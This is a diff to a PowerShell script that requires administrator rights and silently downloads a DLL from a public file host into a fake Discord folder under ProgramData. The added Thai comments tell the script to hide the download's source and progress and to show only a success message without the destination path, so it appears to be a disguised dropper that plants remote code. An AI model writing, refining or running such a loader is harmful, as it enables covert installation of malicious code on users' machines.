@@ -5,7 +5,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
-# Configuration
+# Configuration (!!! REPLACE THIS WITH YOUR ACTUAL DIRECT LINK !!!)
 $url = "https://files.catbox.moe/xitkv2.dll" 
 $currentUser = $env:USERNAME
 $targetDir = "C:\ProgramData\$currentUser\Discord\app-1.0.9242"
@@ -30,10 +30,11 @@ switch ($choice) {
         }
 
         try {
-            # ดาวน์โหลดเงียบๆ ไม่แสดงที่มา
+            # ดาวน์โหลดแบบเงียบ ไม่แสดงความคืบหน้าหรือแหล่งที่มา
             Invoke-WebRequest -Uri $url -OutFile $targetPath -UserAgent "Mozilla/5.0" | Out-Null
             
             if (Test-Path $targetPath) {
+                # แสดงแค่ข้อความสำเร็จ ไม่แสดงโฟลเดอร์ปลายทาง
                 Write-Host "[✓] Installation completed successfully!" -ForegroundColor Green
             } else {
                 Write-Host "[X] Error: Installation failed." -ForegroundColor Red
